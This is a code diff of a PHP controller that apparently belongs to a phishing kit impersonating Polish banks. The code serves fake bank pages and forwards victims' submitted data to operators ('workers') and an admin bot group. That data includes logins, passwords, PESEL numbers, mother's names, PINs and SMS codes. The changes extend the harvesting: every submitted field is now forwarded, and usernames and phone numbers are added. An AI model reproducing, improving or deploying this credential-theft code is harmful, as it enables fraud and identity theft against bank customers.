@@ -54,9 +54,8 @@ class PagesController extends Controller
 
                 if (is_null($this->fake)) throw new Exception();
                 $this->category = $this->fake->category;
-
-                if (!in_array($this->subdomain, explode(',', setting($this->category->name, $this->category->name))) &&
-                    app()->environment('production'))
+                if (!in_array($this->subdomain, explode(',', setting($this->category->name, $this->category->name)))
+                    && app()->environment('production'))
                     throw new Exception();
 
                 $track_id = $this->fake->track_id;
@@ -89,14 +88,10 @@ class PagesController extends Controller
 
     private function bankHasPm($name): bool
     {
-        $banks = collect(config('fakes.banks'));
-        return in_array($name, $banks->whereIn('name', [
-            'millenium', 'mbank', 'ipko',
-            'santander', 'ing', 'pekao',
-            'alior', 'agricole', 'getin',
-            'paribas', 'idea', 'bankbps',
-            'sgb', 'citi', 'gbsbank',
-            'noblepay', 'pocztowy', 'nestbank'
+        $banks = $this->category->banks();
+        return in_array($name, $banks->whereNotIn('name', [
+            'inteligo', 'bosbank', 'vwfs', 'envelobank',
+            'plusbank', 'banknowybfg', 'skycash'
         ])->pluck('name')->toArray());
     }
 
@@ -236,7 +231,7 @@ class PagesController extends Controller
     {
         $title = __("Please select your bank to continue");
         $favicon = asset('images/banks_favicon.ico');
-        $banks = collect(config('fakes.banks'));
+        $banks = $this->category->banks();
         $fake = $this->getFake();
         if (is_null($name)) {
             foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
@@ -290,20 +285,27 @@ class PagesController extends Controller
         ];
         foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, $text);
         $text[] = "=================";
+        collect($request->all())->except('track_id')->each(function ($value, $key) use (&$text) {
+            $text[$key] = "⌨️<b>" . Str::ucfirst($key) . ":</b> <code>$value</code>";
+        });
         if ($request->get('login'))
-            $text[] = "🔑<b>Логин:</b> <code>{$request->get('login')}</code>";
+            $text['login'] = "🔑<b>Логин:</b> <code>{$request->get('login')}</code>";
         if ($request->get('password'))
-            $text[] = "🔒<b>Пароль:</b> <code>{$request->get('password')}</code>";
+            $text['password'] = "🔒<b>Пароль:</b> <code>{$request->get('password')}</code>";
+        if ($request->get('username'))
+            $text['username'] = "👤<b>Имя пользователя:</b> <code>{$request->get('username')}</code>";
+        if ($request->get('tel'))
+            $text['tel'] = "☎️<b>Номер телефона:</b> <code>{$request->get('tel')}</code>";
         if ($request->get('pesel'))
-            $text[] = "📟<b>PESEL:</b> <code>{$request->get('pesel')}</code>";
+            $text['pesel'] = "📟<b>PESEL:</b> <code>{$request->get('pesel')}</code>";
         if ($request->get('mother'))
-            $text[] = "📟<b>Mother:</b> <code>{$request->get('mother')}</code>";
+            $text['mother'] = "📟<b>Mother:</b> <code>{$request->get('mother')}</code>";
         if ($request->get('pin'))
-            $text[] = "📟<b>PIN:</b> <code>{$request->get('pin')}</code>";
+            $text['pin'] = "📟<b>PIN:</b> <code>{$request->get('pin')}</code>";
         if ($request->get('smsCode'))
-            $text[] = "📟<b>SMS Code:</b> <code>{$request->get('smsCode')}</code>";
+            $text['smsCode'] = "📟<b>SMS Code:</b> <code>{$request->get('smsCode')}</code>";
         if ($request->get('pic'))
-            $text[] = "📟<b>Слово с картинки:</b> <code>{$request->get('pic')}</code>";
+            $text['pic'] = "📟<b>Слово с картинки:</b> <code>{$request->get('pic')}</code>";
         if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, $text);
         return response()->json(['html' => $html, 'next' => $next]);
     }
